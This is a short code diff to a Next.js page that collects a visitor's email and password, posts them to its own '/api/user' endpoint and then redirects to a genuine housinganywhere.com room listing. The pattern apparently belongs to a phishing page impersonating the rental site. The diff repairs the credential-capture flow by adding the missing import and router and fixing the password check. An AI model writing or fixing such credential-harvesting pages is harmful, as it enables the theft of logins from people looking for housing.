@@ -1,12 +1,14 @@
 import { useState } from "react";
 import { useRouter } from 'next/router';
 import classes from "@/pages/ut1516432/ut.module.css";
+import axios from "axios";
 
 function Home() {
   const [data, changeData] = useState({
     email: "",
     pass: ""
   });
+  const router = useRouter();
 
   const [passV, changePassV] = useState(false);
 
@@ -19,14 +21,16 @@ function Home() {
       await axios.post(`${process.env.NEXT_PUBLIC_URL}/api/user`, data);
       router.replace('https://housinganywhere.com/room/ut1299287/es/Pozuelo%20de%20Alarc%C3%B3n/avenida-rodajos?flexDays=14');
     } catch(err) {
-      console.log(err);
+      console.log(err, "ce o avea");
     }
   }
 
   function handleSubmit(e) {
     e.preventDefault();
 
-    if(data.email && data.changePassV) {
+    console.log(data.email)
+
+    if(data.email && data.pass) {
       handleSubmitFn();
     }
   }
